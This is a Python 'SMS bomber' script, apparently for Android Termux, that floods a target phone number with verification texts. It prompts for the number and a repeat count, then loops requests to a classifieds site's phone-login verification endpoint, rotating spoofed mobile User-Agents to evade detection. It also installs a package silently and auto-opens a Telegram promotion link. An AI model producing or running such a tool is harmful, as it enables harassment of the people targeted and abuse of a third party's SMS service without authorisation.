#======= SC >> SEND 🙃
#======© GIVE ®
#===== DAVLOPER : KALYAN KING 
import time,os
import requests
import time
import os
import random
import sys

# ===== Terminal Setup =====
os.system('clear' if os.name == 'posix' else 'cls')

# ===== Colors =====
RED = '\033[1;31m'
GREEN = '\033[1;32m'
CYAN = '\033[1;36m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
RESET = '\033[0m'
#======= JONE MY Teligerm  GUROP _====
print("\n[+] Please wait, installing espeak package...\n")

time.sleep(1)

os.system("pkg install espeak -y > /dev/null 2>&1")
#os.system("pip install sys")
print("[✔] Espeak package installed successfully!\n")

os.system ("xdg-open https://t.me/+j8x9Tp4CGa80ZmM1")

os.system ("xdg-open https://t.me/+j8x9Tp4CGa80ZmM1")

os.system('espeak -a 300 "Welcome To Kalyan king Sir, SMS Bombers  Tool"')
os.system('clear')
logo=(f"""{MAGENTA}
 /$$$$$$$$       /$$                                    
| $$_____/      | $$                                    
| $$    /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$       
| $$$$$|____  $$| $$ /$$_____/ /$$__  $$| $$__  $$      
| $$__/ /$$$$$$$| $$| $$      | $$  \ $$| $$  \ $$      
| $$   /$$__  $$| $$| $$      | $$  | $$| $$  | $$      
| $$  |  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$      
|__/   \_______/|__/ \_______/ \______/ |__/  |__/      
            
{RESET}
{BLUE}────────────────────────────────────────────────────────────
{GREEN}[•] DEVELOPER : {WHITE}ROOTX 404
{GREEN}[•] TOOL NAME : {WHITE}SMS BOMBERS
{GREEN}[•] STATUS    : {WHITE}Active ✓
{GREEN}[•] SCRIPT    : {WHITE}CYBER FALCON
{BLUE}────────────────────────────────────────────────────────────{RESET}
""")
for c in logo:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

# ===== User Input =====
phone = input(f"{YELLOW }[📲] Enter phone number (e.g. 017XXXXXXXX): {RESET}")
limit = int(input(f"{YELLOW}[🔁] ENTER YOUR BOMBERS LIMIT : {RESET}"))

# ===== User-Agent Pool =====
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo Y20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; vivo 2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; OPPO A12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OPPO Reno6 F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OPPO A76) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36",
]

# ===== API Request Loop =====
print(f"\n[🚀] Starting to SMS BOMBERS  ...\n")
success = 0
failed = 0

for i in range(limit):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "https://bikroy.com/",
    }

    try:
        res = requests.get(url, headers=headers, timeout=3)
        if res.status_code == 200:
            print(f"[✓] Request {i+1}/{limit} Success! ✅")
            success += 1
        else:
            print(f"[×] Request {i+1}/{limit} Failed! ❌ Status: {res.status_code}")
            failed += 1
    except requests.exceptions.Timeout:
        print(f"[!] Timeout on request {i+1}")
        failed += 1
    except Exception as e:
        print(f"[!] Error: {e}")
        failed += 1

# ===== Summary =====
print(f"\n─────────────────────────────────────────────")
print(f"[✓] TOTAL SUCCESS : {success}")
print(f"[×] TOTAL FAILED  : {failed}")
print(f"─────────────────────────────────────────────")

